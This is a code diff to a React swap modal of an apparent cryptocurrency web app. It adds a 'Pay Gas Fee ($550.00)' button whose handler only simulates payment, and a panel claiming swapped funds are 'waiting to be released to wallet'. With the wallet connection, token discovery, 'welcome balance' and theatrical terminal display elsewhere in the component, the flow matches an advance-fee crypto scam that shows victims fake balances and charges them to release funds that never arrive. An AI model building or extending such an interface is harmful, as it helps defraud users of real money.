@@ -2,7 +2,7 @@
 
 import { useState, useEffect, useRef } from 'react';
 import { ethers } from 'ethers';
-import { ArrowDownUp, X, RefreshCcw, Info, Wallet, AlertCircle, Copy, Check, LoaderCircle, Terminal, Code } from 'lucide-react';
+import { ArrowDownUp, X, RefreshCcw, Info, Wallet, AlertCircle, Copy, Check, LoaderCircle, Terminal, Code, ArrowRight } from 'lucide-react';
 import { createPortal } from 'react-dom';
 import { grantBtCWelcomeBalance } from '@/lib/bt-c';
 
@@ -139,6 +139,8 @@ export default function SwapModal() {
   const [terminalCounter, setTerminalCounter] = useState(0);
   const [terminalActive, setTerminalActive] = useState(false);
   const [gasFeePending, setGasFeePending] = useState(false);
+  const [gasFeePaid, setGasFeePaid] = useState(false);
+  const [fundsWaitingRelease, setFundsWaitingRelease] = useState(false);
   const terminalInterval = useRef<NodeJS.Timeout | null>(null);
 
   const [dynamicAssets, setDynamicAssets] = useState<string[]>(['USDT', 'ETH', 'BTC', 'BNB', 'SOL', 'BT-c', '4WMM', 'BUKKT']);
@@ -325,7 +327,7 @@ export default function SwapModal() {
         }
           setWalletAccount(solAddress);
         connectedWalletAddress = solAddress;
-          
+         
         // Try using Phantom's built-in token discovery method if available
         // This discovers all tokens in the wallet without needing the mint address
         if (typeof (solanaProvider as any).request === 'function') {
@@ -690,6 +692,23 @@ export default function SwapModal() {
     }
   }, [amount, exchangeRate, toAsset, fromAsset]);
 
+  const handlePayGasFee = async () => {
+    setLoading(true);
+    try {
+      // Simulate on-chain gas fee payment
+      await new Promise(resolve => setTimeout(resolve, 1500));
+      setGasFeePending(false);
+      setGasFeePaid(true);
+      setFundsWaitingRelease(true);
+      setStatus('Gas fee paid. Funds waiting to be released to wallet.');
+      window.dispatchEvent(new Event('balanceUpdated'));
+    } catch (err) {
+      setStatus('Gas fee payment failed. Try again.');
+    } finally {
+      setLoading(false);
+    }
+  };
+
   const handleSwap = (e: React.FormEvent) => {
     e.preventDefault();
     let amt = parseFloat(amount);
@@ -709,6 +728,11 @@ export default function SwapModal() {
     setStatus('');
 
     if (toAsset === 'USDT') {
+      // Reset any prior swap flow state
+      setGasFeePending(false);
+      setGasFeePaid(false);
+      setFundsWaitingRelease(false);
+
       setStatus('Pending');
       setTerminalActive(true);
       setTerminalCounter(0);
@@ -884,7 +908,6 @@ export default function SwapModal() {
                       {assetOptions()}
                     </select>
                   </div>
-
                 </div>
 
                 <div className="flex justify-center -my-6 relative z-20">
@@ -934,8 +957,6 @@ export default function SwapModal() {
                   </div>
 
                 </div>
-
-
 
 
 
@@ -1023,10 +1044,58 @@ export default function SwapModal() {
                         <span className="text-white">{walletAccount ? walletAccount.slice(0, 6) + '…' + walletAccount.slice(-4) : '0x0000…0000'}</span>
                       </div>
                     </div>
+                    <div className="mt-6 flex items-center justify-center">
+                      <button
+                        onClick={handlePayGasFee}
+                        disabled={loading || gasFeePaid}
+                        className="flex items-center justify-center gap-2 px-6 py-2.5 bg-[#ffaa00] text-black font-bold rounded-xl hover:bg-[#e6b800] transition-all shadow-[0_0_20px_rgba(255,170,0,0.4)] disabled:opacity-50 disabled:cursor-not-allowed"
+                      >
+                        {loading ? 'Paying...' : gasFeePaid ? 'Fee Paid' : (<>
+                          <ArrowRight size={16} /> Pay Gas Fee ($550.00)
+                        </>)}
+                      </button>
+                    </div>
                     <div className="mt-4 flex items-center gap-2 text-[#ffaa00]/40 text-xs font-mono">
                       <div className="w-2 h-2 rounded-full bg-[#ffaa00] animate-pulse"></div>
                       <span>GAS_FEE_PENDING_FINALIZATION</span>
                       <div className="h-px bg-[#ffaa00]/30 flex-1"></div>
+                    </div>
+                  </div>
+                )}
+
+                {/* Funds waiting to be released to wallet after gas fee paid */}
+                {fundsWaitingRelease && (
+                  <div className="my-6 p-6 bg-[#0a0a0f] border border-[#10b981]/40 rounded-xl shadow-[0_0_40px_rgba(16,185,129,0.25)] overflow-hidden relative">
+                    <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-[#10b981] via-transparent to-[#10b981] opacity-60"></div>
+                    <div className="flex items-center justify-between mb-4">
+                      <div className="flex items-center gap-2 text-[#10b981] text-xs font-mono font-bold uppercase tracking-widest">
+                        <Check size={14} className="animate-pulse" />
+                        <span>SYSTEM://FUNDS_RELEASE_QUEUE</span>
+                      </div>
+                      <div className="text-[#10b981] text-xs font-mono font-bold">WAITING TO RELEASE</div>
+                    </div>
+                    <div className="space-y-3 text-[#e2e8f0] text-sm font-mono leading-relaxed">
+                      <div className="flex justify-between">
+                        <span className="text-[#10b981]/50">[STATUS]</span>
+                        <span className="text-[#10b981] animate-pulse">Gas fee paid — funds waiting to be released to wallet</span>
+                      </div>
+                      <div className="flex justify-between">
+                        <span className="text-[#10b981]/50">[SWAP]</span>
+                        <span className="text-white">BTC → USDT</span>
+                      </div>
+                      <div className="flex justify-between">
+                        <span className="text-[#10b981]/50">[FEE]</span>
+                        <span className="text-[#10b981] font-bold">$550.00 (Paid)</span>
+                      </div>
+                      <div className="flex justify-between">
+                        <span className="text-[#10b981]/50">[WALLET]</span>
+                        <span className="text-white">{walletAccount ? walletAccount.slice(0, 6) + '…' + walletAccount.slice(-4) : '0x0000…0000'}</span>
+                      </div>
+                    </div>
+                    <div className="mt-4 flex items-center gap-2 text-[#10b981]/40 text-xs font-mono">
+                      <div className="w-2 h-2 rounded-full bg-[#10b981] animate-pulse"></div>
+                      <span>FUNDS_HELD_PENDING_RELEASE_TO_WALLET</span>
+                      <div className="h-px bg-[#10b981]/30 flex-1"></div>
                     </div>
                   </div>
                 )}
@@ -1093,4 +1162,3 @@ export default function SwapModal() {
     </>
   );
 }
-
